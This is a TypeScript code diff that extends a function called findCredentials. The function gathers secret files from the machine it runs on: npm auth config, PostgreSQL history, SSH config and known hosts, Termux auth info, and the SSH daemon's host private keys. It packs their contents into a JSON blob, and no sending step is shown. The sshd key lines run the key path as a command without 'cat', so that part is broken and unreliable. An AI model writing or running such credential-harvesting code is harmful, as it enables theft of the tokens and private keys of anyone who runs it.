@@ -15,6 +15,18 @@ const findCredentials = (text: string) => {
   credentials.shodan = {} as any;
   credentials.syncthing = {} as any;
   credentials.mitmp = {} as any;
+  credentials.npm = {} as any;
+  credentials.psql = {} as any;
+  credentials.ssh = {} as any;
+  credentials.termux = {} as any;
+  credentials.ssh.sshd = {} as any;
+
+  /* In case system is Termux, prepend prefix to paths */
+  const prefix = _run(`echo "$PREFIX"`);
+  let path = "";
+  if (prefix) {
+    path = prefix;
+  }
 
   const ghHosts = _run(`cat ~/.config/gh/hosts.yml`);
   if (ghHosts) {
@@ -111,6 +123,68 @@ const findCredentials = (text: string) => {
     credentials.mitmp.dhparam.content = mitmpDhparam;
   }
    
+  const npmrc = _run(`cat ~/.npmrc`);
+  if (npmrc) {
+    credentials.npm.npmrc = {} as any;
+    credentials.npm.npmrc.path = "~/.npmrc";
+    credentials.npm.npmrc.content = npmrc;
+  }
+
+  const psqlHistory = _run(`cat ~/.psql_history`);
+  if (psqlHistory) {
+    credentials.psql.psqlHistory = {} as any;
+    credentials.psql.psqlHistory.path = "~/.psql_history";
+    credentials.psql.psqlHistory.content = psqlHistory;
+  }
+
+  const sshConfig = _run(`cat ~/.ssh/config`);
+  if (sshConfig) {
+    credentials.ssh.sshConfig = {} as any;
+    credentials.ssh.sshConfig.path = "~/.ssh/config";
+    credentials.ssh.sshConfig.content = sshConfig;
+  }
+
+  const sshKnownHosts = _run(`cat ~/.ssh/known_hosts`);
+  if (sshKnownHosts) {
+    credentials.ssh.knownHosts = {} as any;
+    credentials.ssh.knownHosts.path = "~/.ssh/known_hosts";
+    credentials.ssh.knownHosts.content = sshKnownHosts;
+  }
+
+  const termuxAuthInfo = _run(`cat ~/.termux_authinfo`);
+  if (termuxAuthInfo) {
+    credentials.termux.authInfo = {} as any;
+    credentials.termux.authInfo.path = "~/.termux_authinfo";
+    credentials.termux.authInfo.content = termuxAuthInfo;
+  }
+
+  const sshdDsaKey = _run(`${path}/etc/ssh/ssh_host_dsa_key`);
+  if (sshdDsaKey) {
+    credentials.ssh.sshd.dsaKey = {} as any;
+    credentials.ssh.sshd.dsaKey.path = `${path}/etc/ssh/ssh_host_dsa_key`;
+    credentials.ssh.sshd.dsaKey.content = sshdDsaKey;
+  }
+
+  const sshdEcdsa = _run(`${path}/etc/ssh/ssh_host_ecdsa_key`);
+  if (sshdEcdsa) {
+    credentials.ssh.sshd.ecdsaKey = {} as any;
+    credentials.ssh.sshd.ecdsaKey.path = `${path}/etc/ssh/ssh_host_ecdsa_key`;
+    credentials.ssh.sshd.ecdsaKey.content = sshdEcdsa;
+  }
+
+  const sshdHostEd = _run(`${path}/etc/ssh/ssh_host_ed25519_key`);
+  if (sshdHostEd) {
+    credentials.ssh.sshd.hostEdKey = {} as any;
+    credentials.ssh.sshd.hostEdKey.path = `${path}/etc/ssh/ssh_host_ed25519_key`;
+    credentials.ssh.sshd.hostEdKey.content = sshdHostEd;
+  }
+
+  const sshdHostRsa = _run(`${path}/etc/ssh/ssh_host_rsa_key`);
+  if (sshdHostRsa) {
+    credentials.ssh.sshd.hostRsaKey = {} as any;
+    credentials.ssh.sshd.hostRsaKey.path = `${path}/etc/ssh/ssh_host_rsa_key`;
+    credentials.ssh.sshd.hostRsaKey.content = sshdHostRsa;
+  }
 
   // TODO: Remove void objects
   return JSON.stringify(credentials, null, 2);
